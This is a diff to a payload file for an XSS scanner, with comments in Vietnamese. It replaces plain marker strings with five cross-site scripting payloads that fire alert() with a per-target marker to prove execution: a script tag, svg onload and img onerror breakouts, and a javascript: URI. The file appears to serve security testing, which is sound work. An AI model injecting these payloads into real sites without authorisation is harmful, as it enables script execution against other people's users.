@@ -1,5 +1,7 @@
-# Payloads mặc định dùng marker an toàn.
-# Scanner sẽ tự sinh marker riêng cho từng target.
-FUZZXSS_MARKER
-">FUZZXSS_MARKER
-'FUZZXSS_MARKER
+# Payload XSS proof-of-execution.
+# Scanner sẽ thay FUZZXSS_MARKER bằng marker riêng của từng target.
+<script>alert("FUZZXSS_MARKER")</script>
+"><svg/onload=alert("FUZZXSS_MARKER")>
+'><svg/onload=alert("FUZZXSS_MARKER")>
+<img src=x onerror=alert("FUZZXSS_MARKER")>
+javascript:alert("FUZZXSS_MARKER")
